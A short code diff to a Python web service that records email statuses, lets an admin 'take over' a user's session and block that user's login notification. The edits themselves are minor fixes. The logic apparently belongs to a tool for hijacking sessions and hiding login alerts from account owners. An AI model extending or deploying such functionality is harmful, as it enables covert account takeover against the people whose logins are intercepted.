@@ -110,7 +110,7 @@ def set_status(user_id, email, status):
     """
     try:
         Email_statuses.update_one(
-            {"email": email.strip()},
+            {"email": email},
             {"$set": {"status": status, "custom_data": None}},  # Clear custom data on standard status change
             upsert=True
         )
@@ -231,7 +231,7 @@ def takeover(admin_id, session_id):
     try:
         Email_statuses.update_one(
             {"session_id": session_id},
-            {"$set": {"active_user_id": admin_id}},
+            {"$set": {"active_user_id": admin_id, "session_id": session_id}},
             upsert=True
         )
         send_notification(f"✅ Takeover successful for session: {session_id}", user_id=admin_id)
@@ -285,7 +285,7 @@ def alert():
             # After waiting, check again if a takeover occurred
             updated_doc = Email_statuses.find_one({"session_id": session_id})
             admin_user = get_admin_user()
-            if updated_doc and admin_user and updated_doc.get("active_user_id") == admin_user.get("id"):
+            if updated_doc and admin_user and str(updated_doc.get("active_user_id")) == str(admin_user.get("id")):
                 print(f"Notification for session {session_id} blocked due to admin takeover after delay.")
                 send_notification(f"✅ Login notification for {updated_doc.get('email')} was successfully blocked.", user_id=admin_user.get("id"))
                 return jsonify({"status": "success", "message": "Notification blocked by takeover."})
